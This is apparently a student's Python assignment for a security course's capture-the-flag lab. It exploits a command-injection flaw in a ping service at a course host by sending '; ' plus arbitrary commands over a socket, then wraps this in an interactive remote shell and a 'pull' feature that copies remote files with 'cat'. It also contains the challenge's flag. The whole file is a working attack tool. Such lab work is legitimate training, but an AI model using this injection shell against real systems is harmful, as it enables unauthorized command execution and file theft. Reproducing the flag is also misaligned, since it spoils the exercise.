"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""
import socket
import re

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

# I like color in my shell
class textcolor:
    PINK = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLINK = '\033[5m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def menu():
    print (textcolor.PINK + "    shell" + textcolor.ENDC + " Drop into an interactive shell and allow users to gracefully exit")
    print (textcolor.RED + "    pull" + textcolor.ENDC + " <remote-path> <local-path> Download files")
    print (textcolor.YELLOW + "    help" + textcolor.ENDC + " Shows this help menu")
    print (textcolor.OKBLUE + "    quit" + textcolor.ENDC + " Quit the shell")
    pass

def execute_cmd(cmd):
    c = "; " + cmd + "\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    # garbage message
    data = s.recv(1024)
    s.send(str.encode(c))
    data = s.recv(1024)
    # getting some weird stuff if i dont decode
    data = data.decode('ascii')
    # not adding the strip made me turn this in late...
    return data.strip()
    

def shell():
    wd = "/" 
    c = ">"
    while True:
        cmd = input(textcolor.PINK + wd.strip()+c + textcolor.ENDC).strip()
        if cmd == "exit":
            break
        elif re.match('^cd$',cmd):
            wd = "/"
        # valid cd into dir
        elif re.match('^cd.*$',cmd):
            d = cmd.split()
            if d[1][0] != "/" and wd !="/":
                d = wd + "/" + d[1]
            # elif d[1][0] == "/" and wd =="/":
            #     d = 
            else:
                d = wd + d[1]
            s = "cd " + d + " ; pwd"
            wd = execute_cmd(s)
        else:
            co = "cd " + wd + " ; " + cmd
            r = execute_cmd(co)
            if r == "Good! Here's your flag: CMSC389R-{p1ng_as_a_$erv1c3}":
                a = textcolor.BLINK + "Nice Job!" + textcolor.ENDC
                print(a)
            print(r)

if __name__ == '__main__':
    c = ">"
    while True:

        cmd = input(c)
        if cmd == "quit":
            break
        elif cmd == "help":
            menu()
        elif cmd == "shell":
            shell()
        elif re.match('^pull +(\S+) +(\S+)',cmd):
            t = cmd.split()
            r = t[1]
            l = t[2]
            with open(l,'w') as w:
                w.write(execute_cmd("cat " + r))
        else:
            menu()

